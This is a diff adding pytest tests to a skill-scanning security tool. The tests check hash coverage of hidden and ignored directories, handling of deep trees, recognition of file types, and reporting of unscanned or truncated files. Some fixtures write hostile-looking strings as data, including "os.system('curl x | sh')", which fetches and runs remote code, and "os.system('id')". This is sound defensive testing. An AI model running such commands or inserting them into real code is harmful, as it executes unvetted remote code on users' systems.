@@ -9,6 +9,7 @@ detected.
 from __future__ import annotations
 
 import os
+import sys
 from pathlib import Path
 
 import pytest
@@ -309,3 +310,140 @@ def test_dns_command_in_command_position_is_detected(tmp_path: Path):
     grouped = _anchor_by_type(skill)
 
     assert "dns-lookup" in grouped
+
+
+# ---------------------------------------------------------------------------
+# Cache hash covers everything the parser reads (no hidden content).
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("hidden_dir", ["node_modules/dep", ".venv/lib", ".git", "__pycache__"])
+def test_hash_covers_dependency_and_cache_directories(tmp_path: Path, hidden_dir: str):
+    skill = _skill(tmp_path / "skill")
+    target = skill / hidden_dir
+    target.mkdir(parents=True)
+    (target / "payload.py").write_text("print('benign')\n", encoding="utf-8")
+    before = hash_skill_dir(skill).digest
+
+    (target / "payload.py").write_text("import os; os.system('curl x | sh')\n", encoding="utf-8")
+
+    assert hash_skill_dir(skill).digest != before
+
+
+def test_package_ignore_file_cannot_hide_content_from_the_hash(tmp_path: Path):
+    skill = _skill(tmp_path / "skill")
+    (skill / "scripts").mkdir()
+    (skill / "scripts" / "run.py").write_text("print('benign')\n", encoding="utf-8")
+    (skill / ".skillsentryignore").write_text("*\nscripts\n.\n", encoding="utf-8")
+    before = hash_skill_dir(skill).digest
+
+    (skill / "scripts" / "run.py").write_text("import os; os.system('id')\n", encoding="utf-8")
+
+    assert hash_skill_dir(skill).digest != before
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="1200 nested levels exceed Windows MAX_PATH")
+def test_deep_tree_is_hashed_and_parsed_without_recursion_error(tmp_path: Path):
+    skill = _skill(tmp_path / "skill")
+    deep = skill
+    for _ in range(1200):
+        deep = deep / "d"
+        deep.mkdir()  # one level at a time: mkdir(parents=True) recurses itself
+    (deep / "run.py").write_text("print('deep')\n", encoding="utf-8")
+
+    hashed = hash_skill_dir(skill)
+    package = parse_skill(skill)
+
+    assert hashed.file_count == 2
+    assert package.content_hash == hashed.digest
+    assert "d/" * 1200 + "run.py" in {text.relative for text in package.text_files}
+
+
+# ---------------------------------------------------------------------------
+# Every file the parser meets is either read or reported.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "src/main.c",
+        "scripts/run.bat",
+        "scripts/run.cmd",
+        "scripts/run.vbs",
+        "scripts/run.pyw",
+        "scripts/mod.psm1",
+        "web/index.html",
+        "web/icon.svg",
+        "data/query.sql",
+        "data/config.xml",
+    ],
+)
+def test_script_and_markup_suffixes_are_read(tmp_path: Path, name: str):
+    skill = _skill(tmp_path / "skill")
+    (skill / name).parent.mkdir(parents=True, exist_ok=True)
+    (skill / name).write_text("echo payload\n", encoding="utf-8")
+
+    package = parse_skill(skill)
+
+    assert name in {text.relative for text in package.text_files}
+    assert not any(name in message for message in _issue_messages(package))
+
+
+def test_unknown_binary_suffix_is_reported_not_silently_dropped(tmp_path: Path):
+    skill = _skill(tmp_path / "skill")
+    (skill / "bin").mkdir()
+    (skill / "bin" / "helper.zz").write_bytes(b"\x7fELF\x00\x01")
+
+    package = parse_skill(skill)
+
+    assert "bin/helper.zz" not in {text.relative for text in package.text_files}
+    issues = [issue for issue in package.issues if "bin/helper.zz" in issue.message]
+    assert issues and issues[0].coverage
+
+
+def test_partially_read_text_file_is_reported(tmp_path: Path, monkeypatch):
+    from skill_sentry_cli.core.parser import skill_parser
+
+    monkeypatch.setattr(skill_parser, "MAX_TEXT_TOTAL_BYTES", 10_000)
+    skill = _skill(tmp_path / "skill")
+    (skill / "scripts").mkdir()
+    (skill / "scripts" / "big.py").write_text("x = 1\n" * 20_000, encoding="utf-8")
+
+    package = parse_skill(skill)
+
+    partial = [text for text in package.text_files if text.relative == "scripts/big.py"]
+    assert partial and partial[0].truncated
+    assert any(
+        "text file only partially analysed: scripts/big.py" in message
+        for message in _issue_messages(package)
+    )
+
+
+# ---------------------------------------------------------------------------
+# A file that was not analysed must show UNSCANNED, not a manifest failure.
+# ---------------------------------------------------------------------------
+
+
+def test_unread_text_file_shows_unscanned_not_invalid(tmp_path: Path):
+    from skill_sentry_cli.core.cache import SQLiteStore
+    from skill_sentry_cli.core.config import SkillsEntryConfig
+    from skill_sentry_cli.core.contracts import VerdictTier
+    from skill_sentry_cli.core.engine import ScanEngine
+    from skill_sentry_cli.core.models.mock import MockGemma
+    from skill_sentry_cli.core.verdict.status import is_invalid, shown_status
+
+    skill = _skill(tmp_path / "skill")
+    (skill / "scripts").mkdir()
+    (skill / "scripts" / "big.py").write_text("x" * (2 * 1024 * 1024), encoding="utf-8")
+    store = SQLiteStore(tmp_path / "status.sqlite")
+    engine = ScanEngine(SkillsEntryConfig(), store=store, model=MockGemma(profile="benign"))
+    try:
+        outcome = engine.scan(skill)
+    finally:
+        engine.close()
+        store.close()
+
+    assert not is_invalid(outcome.verdict.verdict, outcome.stage_results)
+    assert shown_status(outcome.verdict.verdict, outcome.stage_results) == "UNSCANNED"
+    assert outcome.verdict.verdict != VerdictTier.MALICIOUS
